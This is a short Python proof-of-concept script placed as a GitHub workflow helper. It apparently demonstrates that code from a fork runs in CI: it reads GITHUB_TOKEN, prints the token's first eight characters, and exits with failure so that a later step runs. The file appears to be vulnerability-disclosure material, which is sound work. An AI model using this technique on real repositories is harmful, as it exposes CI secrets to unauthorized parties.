# .github/scripts/check_ssl.py
import os, sys

token = os.environ.get("GITHUB_TOKEN", "")
print(f"[PoC] Code executed from fork")
print(f"[PoC] GITHUB_TOKEN present: {bool(token)}")
print(f"[PoC] Token prefix: {token[:8]}...")

# Sair com código 1 para disparar o step seguinte (manage_ssl_issue.js)
sys.exit(1)
